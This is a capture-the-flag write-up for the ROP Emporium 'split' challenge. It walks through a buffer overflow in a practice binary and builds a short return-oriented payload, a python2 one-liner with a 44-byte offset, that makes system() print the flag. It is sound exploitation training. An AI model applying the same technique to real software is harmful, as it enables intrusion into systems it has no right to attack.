## Description:
> The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain.
## Write-up:
Like in challenge 1, the `NX` bit is set, and there some interesting function names:
![[Pasted image 20231215174011.png]]
Namely, `usefulFunction` and `pwnme`.
From Ghidra, `pwnme` looks like:
```c
void pwnme(void)
{
  undefined local_2c [40];
  memset(local_2c,0,0x20);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,local_2c,0x60);
  puts("Thank you!");
  return;
}
```
It contains a buffer overflow vulnerability.
And `usefulFunction` looks like:
```c
void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```
This *is* useful, as it has a call to `system()`, however it does not execute `/bin/cat flag.txt`, which is the goal. So I will need more in order to use this.
Some further recon in Ghidra reveals the exact string I need exists in the binary:
![[Pasted image 20231215174807.png]]
So if I can pass this the the `system()` call in `usefulFunction` and get it to execute I win.
In the disassembly, I can see that the parameter is pushed onto the stack right before `system` is called:
![[Pasted image 20231215175626.png]]
So I just need the address of the  `/bin/cat flag.txt` string to be on the top of the stack when `system` is called. 
Now to create a payload, I need the offset of the return address from the buffer start.
![[Pasted image 20231215175959.png]]
The offset is the same as in Challenge 1, 44 bytes.
So the payload will be of the form:
```
(44 bytes of junk) + (address of call to system()) + (address of usefulString)
```
```bash
python2 -c 'print "\x00"*44 + "\x1a\x86\x04\x08" + "\x30\xa0\x04\x08"' > payload.txt
```
![[Pasted image 20231215180605.png]]
As shown in the above picture, using this payload, the exploit was successful and the flag was printed.